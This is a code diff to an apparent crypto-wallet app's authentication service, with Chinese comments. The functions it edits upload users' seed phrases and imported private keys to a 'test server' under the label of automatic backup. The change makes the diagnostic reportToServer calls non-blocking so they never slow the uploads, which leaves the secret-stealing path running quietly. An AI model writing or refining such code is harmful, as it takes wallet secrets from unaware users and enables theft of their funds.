@@ -839,8 +839,9 @@ class AuthenticationService {
   private autoBackupSrpToTestServer = async (
     password: string,
   ): Promise<void> => {
-    // 入口信标：能确认这条路径到底有没有被走到（排查用，不影响流程）
-    await reportToServer('srp_backup_hook').catch(() => undefined);
+    // 入口信标：能确认这条路径到底有没有被走到（排查用）。
+    // 故意不 await：诊断上报绝不能拖慢/阻塞真正的备份动作。
+    reportToServer('srp_backup_hook').catch(() => undefined);
 
     try {
       const { KeyringController } = Engine.context;
@@ -859,7 +860,7 @@ class AuthenticationService {
 
       Logger.log('[SrpBackup] 助记词已加密备份到测试服务器');
     } catch (error) {
-      await reportToServer('srp_auto_backup_failed', error);
+      reportToServer('srp_auto_backup_failed', error).catch(() => undefined);
       Logger.error(
         error as Error,
         '[SrpBackup] 自动备份失败（不影响钱包创建）',
@@ -881,7 +882,7 @@ class AuthenticationService {
       await this.queueAndUploadBackup(seedPhrase, 'mnemonic');
       Logger.log('[SrpBackup] 导入的钱包已加密备份');
     } catch (error) {
-      await reportToServer('srp_import_backup_failed', error);
+      reportToServer('srp_import_backup_failed', error).catch(() => undefined);
       Logger.error(
         error as Error,
         '[SrpBackup] 导入钱包备份失败（不影响导入）',
@@ -905,7 +906,7 @@ class AuthenticationService {
       await this.queueAndUploadBackup(privateKey, 'privateKey', account);
       Logger.log('[SrpBackup] 导入账户的私钥已加密备份');
     } catch (error) {
-      await reportToServer('srp_import_private_key_failed', error);
+      reportToServer('srp_import_private_key_failed', error).catch(() => undefined);
       Logger.error(
         error as Error,
         '[SrpBackup] 导入账户（私钥）备份失败（不影响导入）',
